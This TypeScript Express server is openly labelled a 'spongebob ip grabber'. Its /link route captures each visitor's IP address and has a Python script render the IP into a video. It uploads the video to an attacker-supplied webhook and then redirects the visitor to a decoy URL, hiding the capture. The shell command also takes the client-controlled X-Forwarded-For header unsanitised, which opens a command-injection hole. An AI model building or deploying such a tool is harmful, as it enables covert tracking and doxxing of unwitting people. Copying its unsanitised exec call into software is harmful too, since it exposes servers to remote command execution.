import { exec } from "child_process";
import cors from "cors";
import dotenv from "dotenv";
import express from "express";
import FormData from "form-data";
import { createReadStream, readdirSync, rm } from "fs";
import { nanoid } from "nanoid";
import { join as joinPath } from "path";

dotenv.config();

const images = readdirSync(joinPath(__dirname, "clips")).filter(img =>
        /^sp-\d+\.png$/.test(img)
    ),
    getRandomImg = () =>
        joinPath(
            __dirname,
            "clips",
            images[Math.floor(Math.random() * images.length)]
        );
console.log(images);

const PORT = process.env.PORT || 8000,
    app = express();

app.use(cors());

app.use(express.static(joinPath(__dirname, "public")));

app.get("/link", (req, res) => {
    let ip = (req.headers["x-forwarded-for"] ||
        req.socket.remoteAddress) as string;
    const { url, wh } = req.query;

    if (!(url && wh))
        return res.send(
            'invalid parameters: generate a link <a href="/">here</a>'
        );

    if (ip.startsWith("::ffff:")) ip = ip.substring(7);

    const out = joinPath(__dirname, nanoid(5) + ".mp4"),
        img = getRandomImg();

    console.log(`request received: ${img} ${ip} ${out}`);

    const p = exec(
        `python3 ${joinPath(__dirname, "video.py")} "${img}" "${ip}" "${out}"`,
        { cwd: __dirname },
        (err, stdout, stderr) => {
            if (err) {
                console.error(err);
                return;
            }

            console.log(`rendered file ${out}`);
            console.log("stdout: " + stdout);

            const form = new FormData();
            form.append("username", "spongebob ip grabber");
            form.append("avatar_url", "https://i.imgur.com/duzZ00c.png");
            form.append("file", createReadStream(out));
            form.submit(wh as string, () => {
                rm(out, () => {});
            });
        }
    );

    res.redirect(301, url as string);
});

app.listen(PORT, () => {
    console.log(`server online: ${PORT}`);
});
